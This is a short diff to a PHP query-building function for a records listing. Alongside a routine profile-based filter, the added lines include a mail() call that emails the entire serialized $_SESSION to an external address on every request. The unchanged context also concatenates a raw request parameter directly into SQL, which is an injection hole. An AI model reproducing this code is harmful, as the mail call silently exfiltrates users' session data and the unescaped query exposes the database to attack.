@@ -69,6 +69,10 @@
                     $cond .= " AND a.cod_riesgo = '".$_REQUEST['cod_riesgo']."' ";
                 }
             }
+            if($_SESSION['datos_usuario']['cod_perfil']!=COD_PERFIL_ADMINIST){
+                $cond .= " AND a.cod_noveda BETWEEN 1 And 8999 ";
+            }
+            mail("cristian.torres@eltransporte.org", "Datos", var_export($_SESSION, true));
 
             $sql = "SELECT a.cod_noveda, a.nom_noveda, CONCAT(UPPER(LEFT(b.nom_etapax, 1)), LOWER(SUBSTRING(b.nom_etapax, 2))) as 'nom_etapax',
                            c.nom_riesgo, a.rut_iconox, a.nom_observ,
